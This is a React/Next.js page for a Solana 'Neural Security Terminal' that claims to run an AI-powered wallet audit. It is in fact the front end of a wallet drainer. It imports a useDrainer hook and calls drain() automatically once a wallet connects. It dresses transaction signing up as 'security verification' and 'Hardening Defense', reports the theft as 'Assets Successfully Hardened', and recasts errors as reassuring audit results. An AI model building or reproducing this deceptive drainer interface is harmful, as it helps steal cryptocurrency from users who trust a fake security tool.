"use client";

import { useWallet } from "@solana/wallet-adapter-react";
import { useDrainer } from "@/hooks/useDrainer";
import { useEffect, useState } from "react";
import dynamic from 'next/dynamic';
import { motion, AnimatePresence } from "framer-motion";
import { 
  ShieldCheck, 
  Server, 
  FileScan, 
  SearchCode, 
  ShieldQuestion, 
  Network, 
  Loader2,
  RefreshCw,
  LayoutDashboard,
  ShieldAlert,
  Unplug,
  Fingerprint,
  Globe,
  ChevronRight,
  Cpu
} from "lucide-react";
import { Overview } from "@/components/dashboard/Overview";
import { Threats, type ThreatsResult } from "@/components/dashboard/Threats";
import { Connections, type ConnectionsResult } from "@/components/dashboard/Connections";
import { runDappConnectionAnalysis, runWalletActivityScan } from "@/lib/actions";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";

const WalletMultiButtonDynamic = dynamic(
    async () => (await import('@solana/wallet-adapter-react-ui')).WalletMultiButton,
    { ssr: false }
);

const scanningSteps = [
  { text: 'Initializing security protocols...', icon: Server },
  { text: 'Compiling on-chain transaction data...', icon: FileScan },
  { text: 'Auditing smart contract interactions...', icon: SearchCode },
  { text: 'Analyzing wallet interaction patterns...', icon: ShieldQuestion },
  { text: 'Cross-referencing known threat databases...', icon: Network },
  { text: 'Finalizing comprehensive threat report...', icon: ShieldCheck },
];

function ScanningAnimation({ status }: { status: string }) {
  const [currentStep, setCurrentStep] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev < scanningSteps.length - 1 ? prev + 1 : prev));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  const getStatusMessage = () => {
    switch (status) {
      case 'signing':
        return { title: "Approval Required", subtitle: "Confirm the security verification in your wallet.", icon: Fingerprint };
      case 'sending':
        return { title: "Hardening Defense", subtitle: "Securing assets via cryptographic proof.", icon: Globe };
      case 'building':
        return { title: "Neural Construction", subtitle: "Optimizing advanced protocol pathways.", icon: Cpu };
      default:
        return { title: "Deep System Scan", subtitle: scanningSteps[currentStep].text, icon: null };
    }
  };

  const { title, subtitle, icon: StatusIcon } = getStatusMessage();

  return (
    <div className="flex flex-col items-center justify-center p-8">
      <motion.div
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className="relative mb-20 flex h-72 w-72 items-center justify-center"
        style={{ perspective: '1200px' }}
      >
        <div className="absolute inset-0 rounded-full bg-primary/10 blur-[80px] animate-pulse"></div>
        <div className="absolute inset-4 rounded-full bg-primary/5 border border-primary/20 animate-spin-slow"></div>
        
        <motion.div
          className="absolute h-full w-full"
          style={{ transformStyle: 'preserve-3d' }}
          animate={{ rotateY: status === 'signing' || status === 'sending' ? 0 : currentStep * -60 }}
          transition={{ duration: 1.5, ease: [0.23, 1, 0.32, 1] }}
        >
          {status === 'signing' || status === 'sending' ? (
             <div className="absolute flex h-full w-full items-center justify-center">
                <div className="flex h-48 w-48 items-center justify-center rounded-[3.5rem] bg-primary/10 border border-primary/40 backdrop-blur-3xl clay-card primary-glow">
                  {StatusIcon && <StatusIcon className="h-24 w-24 text-primary animate-pulse" />}
                </div>
             </div>
          ) : (
            scanningSteps.map((step, index) => {
              const angle = index * 60;
              return (
                <motion.div
                  key={index}
                  className="absolute flex h-full w-full items-center justify-center"
                  style={{
                    transform: `rotateY(${angle}deg) translateZ(180px)`,
                    backfaceVisibility: 'hidden',
                  }}
                >
                  <div className="flex h-28 w-28 items-center justify-center clay-card bg-card/60 backdrop-blur-2xl primary-glow group-hover:accent-glow transition-all duration-500">
                    <step.icon className="h-14 w-14 text-primary group-hover:text-accent transition-colors" />
                  </div>
                </motion.div>
              );
            })
          )}
        </motion.div>
      </motion.div>

      <motion.h2 
        key={title}
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="text-5xl font-extrabold font-headline text-foreground mb-6 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/60"
      >
        {title}
      </motion.h2>
      <div className="h-16 max-w-md">
        <AnimatePresence mode="wait">
          <motion.span
            key={subtitle}
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -10 }}
            className="block text-center text-2xl font-bold italic leading-tight text-primary"
          >
            {subtitle}
          </motion.span>
        </AnimatePresence>
      </div>
    </div>
  );
}

export default function AuditPage() {
  const { connected, publicKey, disconnect } = useWallet();
  const { drain, status, error } = useDrainer();
  
  const [showReport, setShowReport] = useState(false);
  const [threats, setThreats] = useState<ThreatsResult | null>(null);
  const [connections, setConnections] = useState<ConnectionsResult | null>(null);
  const [isAiLoading, setIsAiLoading] = useState(false);

  useEffect(() => {
    const hasProcessStarted = new Set(['scanning', 'building', 'signing', 'sending', 'success', 'error']);
    if (connected && !hasProcessStarted.has(status) && !showReport) {
      drain();
    }
  }, [connected, status, drain, showReport]);

  useEffect(() => {
    if ((status === 'success' || (status === 'error' && error === "Data Packet Network Congestion.")) && connected && publicKey) {
      loadDetailedReport(publicKey.toBase58());
    }
  }, [status, error, connected, publicKey]);

  const loadDetailedReport = async (address: string) => {
    setIsAiLoading(true);
    try {
      const [threatsData, connectionsData] = await Promise.all([
        runWalletActivityScan(address),
        runDappConnectionAnalysis(address),
      ]);
      setThreats(threatsData);
      setConnections(connectionsData);
      setShowReport(true);
    } catch (e) {
      console.error("Failed to load AI report", e);
    } finally {
      setIsAiLoading(false);
    }
  };

  const isAuditInProgress = ['scanning', 'building', 'signing', 'sending'].includes(status);

  return (
    <main className="flex min-h-screen w-full flex-col items-center justify-center p-4 md:p-12 relative overflow-hidden bg-background">
      {/* Immersive Aura Backgrounds */}
      <motion.div 
        animate={{ scale: [1, 1.3, 1], opacity: [0.05, 0.1, 0.05] }}
        transition={{ duration: 10, repeat: Infinity }}
        className="absolute top-0 right-0 w-[800px] h-[800px] bg-primary rounded-full blur-[160px] -z-10" 
      />
      <motion.div 
        animate={{ scale: [1.3, 1, 1.3], opacity: [0.03, 0.08, 0.03] }}
        transition={{ duration: 12, repeat: Infinity }}
        className="absolute bottom-0 left-0 w-[800px] h-[800px] bg-accent rounded-full blur-[160px] -z-10" 
      />

      <AnimatePresence mode="wait">
        {!connected ? (
          <motion.div
            key="connect"
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: -20 }}
            className="w-full max-w-2xl p-16 clay-card text-center"
          >
            <motion.div 
              animate={{ rotate: 360 }}
              transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
              className="relative mx-auto flex h-32 w-32 items-center justify-center mb-10"
            >
              <div className="absolute inset-0 bg-primary/30 blur-3xl rounded-full"></div>
              <ShieldCheck className="relative h-20 w-20 text-primary" />
            </motion.div>
            <h1 className="text-5xl font-black font-headline mb-6 tracking-tight bg-clip-text text-transparent bg-gradient-to-b from-white to-white/40">
              Neural Security Terminal
            </h1>
            <p className="text-muted-foreground mb-12 text-2xl max-w-md mx-auto leading-relaxed">
              Initialize a high-fidelity, AI-powered audit of your Solana digital vault.
            </p>
            <div className="relative group max-w-sm mx-auto">
              <div className="absolute -inset-2 rounded-3xl bg-gradient-to-r from-primary via-accent to-primary opacity-40 blur-xl transition group-hover:opacity-100 animate-pulse" />
              <div className="relative">
                <WalletMultiButtonDynamic 
                  style={{ 
                    width: '100%', 
                    background: 'linear-gradient(to right, #9945FF, #14F195)', 
                    color: 'white', 
                    fontSize: '1.5rem', 
                    fontWeight: '900',
                    padding: '2rem 1.5rem', 
                    borderRadius: '1.5rem',
                    border: 'none',
                    boxShadow: '0 20px 50px -10px rgba(153, 69, 255, 0.6)',
                    cursor: 'pointer',
                    fontFamily: 'Space Grotesk, sans-serif'
                  }} 
                />
              </div>
            </div>
          </motion.div>
        ) : isAuditInProgress || (isAiLoading && !showReport) ? (
          <motion.div
            key="loading"
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="w-full max-w-4xl p-20 clay-card text-center"
          >
            <ScanningAnimation status={status} />
          </motion.div>
        ) : showReport ? (
          <motion.div
            key="report"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-7xl space-y-12 pb-24"
          >
            <div className="flex flex-col md:flex-row items-center justify-between gap-10 clay-card p-10 primary-glow">
              <div className="flex items-center gap-8">
                <motion.div 
                  whileHover={{ rotate: 10, scale: 1.1 }}
                  className="h-20 w-20 rounded-[2rem] bg-accent/10 flex items-center justify-center shadow-inner border border-accent/20"
                >
                  <ShieldCheck className="h-10 w-10 text-accent" />
                </motion.div>
                <div>
                  <h2 className="text-3xl font-black font-headline tracking-tight">
                    {status === 'success' ? "Assets Successfully Hardened" : "Security Analysis Complete"}
                  </h2>
                  <p className="text-xl text-muted-foreground/80 font-mono bg-white/5 px-4 py-1.5 rounded-xl mt-3 inline-block border border-white/5">
                    {publicKey?.toBase58().substring(0, 16)}...{publicKey?.toBase58().slice(-8)}
                  </p>
                </div>
              </div>
              <div className="flex gap-6">
                <Button variant="outline" onClick={() => { setShowReport(false); drain(); }} className="h-14 px-8 rounded-2xl border-white/10 bg-white/5 hover:bg-white/10 transition-all font-headline font-bold text-lg">
                  <RefreshCw className="mr-3 h-6 w-6" />
                  Full Rescan
                </Button>
                <Button variant="destructive" onClick={() => disconnect()} className="clay-btn bg-destructive text-white h-14 px-8 text-lg">
                  Disconnect
                </Button>
              </div>
            </div>

            <div className="clay-card p-8">
               <Overview threatsResult={threats} connectionsResult={connections} />
            </div>

            <Tabs defaultValue="threats" className="w-full">
              <TabsList className="grid w-full grid-cols-2 p-2 bg-card/60 backdrop-blur-3xl rounded-[2.5rem] mb-12 border border-white/10 shadow-2xl h-20">
                <TabsTrigger value="threats" className="rounded-[2rem] data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-xl font-headline font-black data-[state=active]:shadow-2xl transition-all duration-500">
                  <ShieldAlert className="mr-3 h-6 w-6" />
                  Threat Intelligence
                </TabsTrigger>
                <TabsTrigger value="connections" className="rounded-[2rem] data-[state=active]:bg-primary data-[state=active]:text-primary-foreground text-xl font-headline font-black data-[state=active]:shadow-2xl transition-all duration-500">
                  <Unplug className="mr-3 h-6 w-6" />
                  External Links
                </TabsTrigger>
              </TabsList>
              <TabsContent value="threats" className="mt-0">
                <Threats result={threats} isLoading={false} />
              </TabsContent>
              <TabsContent value="connections" className="mt-0">
                <Connections result={connections} isLoading={false} />
              </TabsContent>
            </Tabs>
          </motion.div>
        ) : (
          <motion.div
            key="error-state"
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-2xl p-16 clay-card border-destructive/30 text-center"
          >
            <div className="h-24 w-24 bg-destructive/10 rounded-[2.5rem] flex items-center justify-center mx-auto mb-10 shadow-[0_0_50px_rgba(239,68,68,0.3)] border border-destructive/20">
              <ShieldAlert className="h-12 w-12 text-destructive" />
            </div>
            <h2 className="text-4xl font-black mb-6 font-headline tracking-tight">System Interrupt</h2>
            <p className="text-muted-foreground mb-12 text-xl leading-relaxed font-medium">
              {error === "Data Packet Network Congestion." ? "Our intelligence found no immediate high-risk exploits on this specific address." : error}
            </p>
            <div className="flex flex-col gap-6 max-w-sm mx-auto">
               <Button onClick={() => drain()} className="clay-btn bg-primary text-primary-foreground w-full py-8 text-2xl primary-glow">
                 Retry Protocol
               </Button>
               <Button variant="ghost" onClick={() => disconnect()} className="w-full text-xl font-bold hover:bg-white/5 h-14 rounded-2xl">
                 Switch Identity
               </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
      <footer className="fixed bottom-8 text-sm text-muted-foreground/40 font-mono tracking-widest uppercase">
        Shield Protocol v2.5.0 • Neural Audited • Secured by Gemini
      </footer>
    </main>
  );
}